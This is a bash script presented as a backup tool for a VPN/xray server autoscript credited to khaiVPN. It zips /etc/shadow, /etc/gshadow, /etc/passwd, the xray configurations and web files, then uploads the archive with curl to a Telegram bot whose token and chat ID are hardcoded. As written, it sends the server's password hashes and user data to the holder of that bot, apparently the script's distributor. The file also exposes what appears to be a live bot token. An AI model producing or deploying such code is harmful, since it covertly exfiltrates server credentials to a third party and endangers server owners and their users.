#!/bin/bash
# =========================================
# Quick Setup | vpn autoscript xray
# Edition : vless only + websocket + tls + vision
# SC by khaiVPN
# BACKUP TOOLS BY khaiVPN
# =========================================

red='\e[1;31m'
green='\e[0;32m'
purple='\e[0;35m'
orange='\e[0;33m'
NC='\e[0m'
clear

IPVPS=$(curl -s https://checkip.amazonaws.com)
date=$(date +"%d-%m-%Y-%H:%M:%S")
domain=$(cat /root/yoloautosc/domain)

# TOTAL ACC XRAYS WS & XTLS

tvless=$(grep -c -E "^### $user" "/usr/local/etc/xray/vless.json")
ttxtls=$(grep -c -E "^### $user" "/usr/local/etc/xray/config.json")


Total_User=$(($tvless + $ttxtls))

clear
echo " VPS Data Backup By khaiVPN "
sleep 1
echo -e "[ ${green}INFO${NC} ] Processing . . . "
mkdir -p /root/backup
sleep 1
clear
echo " Please Wait VPS Data Backup In Progress . . . "
echo -e "[ ${green}INFO${NC} ] • VPS Data Backup... "
    sleep 1
    echo -e "[ ${green}INFO${NC} ] • Directory Created... "
    mkdir /root/backup &>/dev/null
    sleep 1
    echo -e "[ ${green}INFO${NC} ] • VPS Data Backup Start Now... "
    echo -e "[ ${green}INFO${NC} ] • Please Wait , Backup In Process Now... "
    sleep 1
    cp /etc/passwd backup/ &>/dev/null
    echo -e "[ ${green}INFO${NC} ] • Backup passwd data..."
    sleep 1
    cp /etc/group backup/ &>/dev/null
    echo -e "[ ${green}INFO${NC} ] • Backup group data..."
    sleep 1
    cp /etc/shadow backup/ &>/dev/null
    echo -e "[ ${green}INFO${NC} ] • Backup shadow data..."
    sleep 1
    cp /etc/gshadow backup/ &>/dev/null
    echo -e "[ ${green}INFO${NC} ] • Backup gshadow data..."
    sleep 1
    cp -r /var/lib/premium-script/ backup/premium-script &>/dev/null
    cp -r /usr/local/etc/xray backup/xray &>/dev/null
    cp -r /home/vps/public_html backup/public_html &>/dev/null

cd /root
zip_filename="backup-$domain.zip"
zip -r $zip_filename /root/backup > /dev/null 2>&1

# Replace the following values with your own Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN=7449633234:AAEqUHsYNL74U_6mtadoTITPmKNV2Fwfds4
TELEGRAM_CHAT_ID=5047657342

# Use the following URL to send a file to Telegram using the bot API
TELEGRAM_API_URL="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument"

# caption for the backup file
CAPTION="
SERVER IP:$IPVPS
CREATED ON:$date
DOMAIN:$domain
Total ID: $Total_User"

# Send the backup file to Telegram with the zip file name as caption
curl -s -F "chat_id=${TELEGRAM_CHAT_ID}" -F "document=@/root/${zip_filename}" -F "caption=${CAPTION}" "${TELEGRAM_API_URL}" > /dev/null

clear
echo -e "\033[1;37mVPS Data Backup By khaiVPN\033[0m"
echo ""
echo "Backup has been sent to Telegram bot."
rm -rf /root/backup
rm -r /root/${zip_filename}
echo ""
read -p "$( echo -e "Press ${orange}[ ${NC}${green}Enter${NC} ${CYAN}]${NC} Back to menu . . .") "
clear
